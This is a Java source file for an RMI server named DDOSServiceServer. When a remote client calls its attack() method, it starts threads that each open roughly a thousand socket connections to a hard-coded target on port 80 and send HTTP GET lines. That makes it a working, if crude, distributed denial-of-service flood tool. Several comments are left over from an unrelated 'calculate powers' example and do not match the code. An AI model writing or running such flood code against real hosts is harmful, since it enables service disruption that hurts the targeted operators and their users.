import java.math.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
//
// DDOSServiceServer
//
// Server for a RMI service that calculates powers
//
public class DDOSServiceServer extends UnicastRemoteObject implements Runnable, DDOSService
{ //Target Machine
final String TARGET = "localhost";
static DDOSServiceServer _instance;
public DDOSServiceServer () throws RemoteException
{
super();
}
// Calculate the square of a number
public String attack( )
throws RemoteException
{
_instance = new DDOSServiceServer ();
//2 threads on each machine
for (int i = 0; i &lt; 2; i++)
new Thread(_instance).start();
String attack;

attack = "Attacking:"+ TARGET ;
return attack;
}
public void run() {
//1000 HTTP Requests using each client you can send more requests too
for (int i = 1; i &lt; 1000; i++) {
try {
Socket net = new Socket(TARGET, 80); // connects the Socket to the TARGET port 80.
sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
sendRawLine("Host: " + TARGET, net); // Sends Host: to the OutputStream
System.out.println("Attacking on Target  "+TARGET+" with Connection #: " + i);
} catch (UnknownHostException e) {
System.out.println("DDoS.run: " + e);
} catch (IOException e) {
System.out.println("DDoS.run: " + e);
}
}
}

public static void main ( String args[] ) throws Exception
{
// Assign a security manager, in the event that dynamic
// classes are loaded

// Create an instance of our power service server ...
DDOSServiceServer svr = new DDOSServiceServer();
// ... and bind it with the RMI Registry
Naming.bind ("DDOSService", svr);
System.out.println ("Service bound....");
}
public static void sendRawLine(String text, Socket sock) {
try {
BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
out.write(text + " ");
out.flush();
} catch (IOException ex) {
ex.printStackTrace();
}
}
}